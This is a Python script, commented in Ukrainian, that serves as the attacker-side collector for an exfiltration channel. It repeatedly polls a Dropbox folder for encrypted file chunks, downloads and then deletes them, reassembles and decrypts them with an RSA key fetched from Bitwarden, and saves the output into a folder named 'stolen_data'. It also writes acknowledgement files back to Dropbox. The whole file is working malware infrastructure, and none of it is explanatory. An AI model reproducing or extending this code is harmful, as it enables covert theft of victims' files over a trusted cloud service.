import dropbox
import base64
import time
import hashlib
import os
from dotenv import load_dotenv, find_dotenv
from bitwarden_sdk import BitwardenClient, ClientSettings
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.fernet import Fernet

load_dotenv(find_dotenv())

APP_KEY = os.getenv("DROPBOX_APP_KEY")
APP_SECRET = os.getenv("DROPBOX_APP_SECRET")
REFRESH_TOKEN = os.getenv("DROPBOX_REFRESH_TOKEN")
BWS_ACCESS_TOKEN = os.getenv("BWS_ACCESS_TOKEN")
SECRET_ID = os.getenv("SECRET_ID")

if not APP_KEY or not BWS_ACCESS_TOKEN:
    print("[-] ПОМИЛКА: Не вдалося завантажити змінні з .env! Перевір файл.")
    exit()

dbx = dropbox.Dropbox(
    app_key=APP_KEY,
    app_secret=APP_SECRET,
    oauth2_refresh_token=REFRESH_TOKEN
)

def get_private_key_from_cloud():
    print("[*] Звертаюся до Bitwarden за приватним ключем...")
    try:
        client = BitwardenClient(ClientSettings(
            identity_url="https://identity.bitwarden.com",
            api_url="https://api.bitwarden.com"
        ))
        
        client.auth().login_access_token(BWS_ACCESS_TOKEN)
        
        secret = client.secrets().get(SECRET_ID)
        key_text = secret.data.value.strip()
        
        loaded_key = serialization.load_pem_private_key(
            key_text.encode(),
            password=None,
        )
        print("[+] УСПІХ: Приватний ключ завантажено з хмари у RAM!")
        return loaded_key
        
    except Exception as e:
        print(f"[-] КРИТИЧНА ПОМИЛКА BITWARDEN: {e}")
        exit()

private_key = get_private_key_from_cloud()

chunks_storage = {}

def assemble_and_decrypt(file_id, expected_hash):
    try:
        info = chunks_storage[file_id]
        full_b64 = "".join(info['chunks'][i] for i in range(info['total']))
        encrypted_binary = base64.b64decode(full_b64)

        enc_aes_key = encrypted_binary[:256]
        enc_data = encrypted_binary[256:]
        aes_key = private_key.decrypt(enc_aes_key, padding.OAEP(mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
        
        cipher_aes = Fernet(aes_key)
        decrypted_data = cipher_aes.decrypt(enc_data)
        
        if hashlib.sha256(decrypted_data).hexdigest() == expected_hash:
            os.makedirs("stolen_data", exist_ok=True)
            save_path = os.path.join("stolen_data", f"recovered_{file_id}.txt")
            
            with open(save_path, "wb") as f: 
                f.write(decrypted_data)
                
            print(f"[+++] Файл {file_id} УСПІШНО зібрано та збережено як {save_path}!")
            dbx.files_upload(b"OK", f"/SUCCESS_{file_id}.ack")
            return True
    except Exception as e:
        print(f"[-] Помилка збірки: {e}")
    return False

def server_loop():
    print("[*] Dropbox Сервер запущено. Сканую хмару...")
    while True:
        try:
            res = dbx.files_list_folder('')
            for entry in res.entries:
                if entry.name.endswith(".dat"):
                    name_parts = entry.name.replace(".dat", "").split("_")
                    if len(name_parts) == 4:
                        f_id, idx, total, f_hash = name_parts
                        idx, total = int(idx), int(total)

                        _, response = dbx.files_download(entry.path_lower)
                        chunk_content = response.content.decode()
                        
                        if f_id not in chunks_storage:
                            chunks_storage[f_id] = {'total': total, 'chunks': {}}
                            
                        chunks_storage[f_id]['chunks'][idx] = chunk_content
                        dbx.files_delete_v2(entry.path_lower)
                        print(f"[*] Отримано шматок {idx+1}/{total} для {f_id}")

                        if len(chunks_storage[f_id]['chunks']) == total:
                            assemble_and_decrypt(f_id, f_hash)
                            del chunks_storage[f_id]

        except Exception as e:
            print(f"[-] Помилка: {e}")
        
        time.sleep(10)

if __name__ == "__main__":
    server_loop()
